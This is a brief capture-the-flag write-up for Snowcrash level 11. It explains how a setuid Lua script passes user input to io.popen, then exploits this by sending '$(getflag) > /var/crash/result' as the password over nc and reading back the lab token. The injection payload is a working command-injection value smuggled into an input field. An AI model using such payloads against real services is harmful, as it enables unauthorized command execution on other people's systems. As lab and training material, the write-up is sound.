# <center>Snowcrash level11</center>

# Explanations

<br/>

## On VM:

> $ ls -l
>> -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

- The script hashes a string to compare it to an existing hash.
- To hash this string, the script uses the io.popen function that executes commands in the shell.
- We will pass as a password the command getflag 
- The /tmp folder is blocked. Let's look for an accessible folder.

> $ ls -l /var/
>> drwxrwsrwt 2 root whoopsie   3 Mar 12  2016 crash

> $ nc localhost 5151
>> Password: $(getflag) > /var/crash/result

> $ cat /var/crash/result
>> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
